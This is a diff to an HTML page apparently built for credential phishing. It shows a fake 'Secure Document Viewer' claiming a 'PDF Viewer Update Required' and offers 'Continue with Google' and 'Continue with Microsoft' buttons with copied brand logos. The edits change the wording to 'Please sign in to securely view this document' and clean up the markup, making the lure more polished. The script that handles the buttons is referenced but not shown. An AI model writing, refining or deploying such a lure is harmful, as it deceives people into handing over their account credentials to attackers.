@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Secure Document Viewer</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="/style.css" />
 </head>
 <body>
 
@@ -13,19 +13,19 @@
 <div class="overlay">
   <div class="card">
 
+    <!-- ICON -->
     <div class="icon-wrapper">
-        <div class="pdf-icon">PDF</div>
-        <div class="warning-icon">!</div>
-      </div>
+      <div class="pdf-file"></div>
+      <div class="warning-badge">!</div>
+    </div>
 
-    <h2>PDF Viewer Update Required</h2>
+    <h2 class="title">PDF Viewer Update Required</h2>
 
     <p>
       Your current PDF extension is outdated or unsupported.<br>
-      Please securely view this document on browser.
+      Please sign in to securely view this document.
     </p>
 
-    <!-- GOOGLE BUTTON -->
     <button class="btn" id="googleLogin">
       <svg class="icon-img" viewBox="0 0 48 48">
         <path fill="#EA4335" d="M24 9.5c3.54 0 6.36 1.53 7.82 2.81l5.76-5.76C33.64 3.04 29.23 1 24 1 14.64 1 6.56 6.94 2.92 14.44l6.9 5.36C11.63 13.08 17.27 9.5 24 9.5z"/>
@@ -36,13 +36,12 @@
       Continue with Google
     </button>
 
-    <!-- MICROSOFT BUTTON -->
     <button class="btn" id="microsoftLogin">
       <svg class="icon-img" viewBox="0 0 24 24">
-        <rect width="10" height="10" x="0" y="0" fill="#F25022"/>
-        <rect width="10" height="10" x="12" y="0" fill="#7FBA00"/>
-        <rect width="10" height="10" x="0" y="12" fill="#00A4EF"/>
-        <rect width="10" height="10" x="12" y="12" fill="#FFB900"/>
+        <rect width="10" height="10" fill="#F25022"/>
+        <rect x="12" width="10" height="10" fill="#7FBA00"/>
+        <rect y="12" width="10" height="10" fill="#00A4EF"/>
+        <rect x="12" y="12" width="10" height="10" fill="#FFB900"/>
       </svg>
       Continue with Microsoft
     </button>
@@ -52,6 +51,6 @@
   </div>
 </div>
 
-<script src="script.js"></script>
+<script src="/script.js"></script>
 </body>
 </html>
